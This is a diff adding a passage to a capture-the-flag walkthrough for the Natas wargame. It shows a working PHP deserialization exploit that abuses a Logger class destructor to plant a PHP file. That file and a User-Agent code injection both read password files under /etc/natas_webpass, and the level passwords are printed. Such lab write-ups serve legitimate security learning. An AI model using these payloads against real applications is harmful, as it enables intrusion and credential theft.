@@ -136,4 +136,20 @@ User-Agent: <?php echo(file_get_contents("/etc/natas_webpass/natas26")); ?>
 ```
 
 natas26:oGgWAJ7zcGT28vYazGo4rkhOPDhBu34T
+This challenge is about uncontrolled `unserialize`.
+In the source file there is an unused `Logger` class. We can use its destructor to write anything we want to a file we can name. We clearly have read and write access to `img/`, which is used to store the images we draw. We can use that directory to write a php page that displays natas27's password.
 
+We simply have to set the cookie `drawing` to the result of this php code. Refresh the page and then, access `img/daniel.php`
+```PHP
+class Logger{
+    //order is important!
+    private $logFile = "img/daniel.php";
+    private $initMsg="heyyyy\n";
+    private $exitMsg="<?php echo(file_get_contents(\"/etc/natas_webpass/natas27\")); ?>\n";
+}
+
+print(base64_encode(serialize(new Logger())));
+```
+
+
+natas27:55TBjpPZUUJgVP5b3BnbG6ON9uDPVzCJ
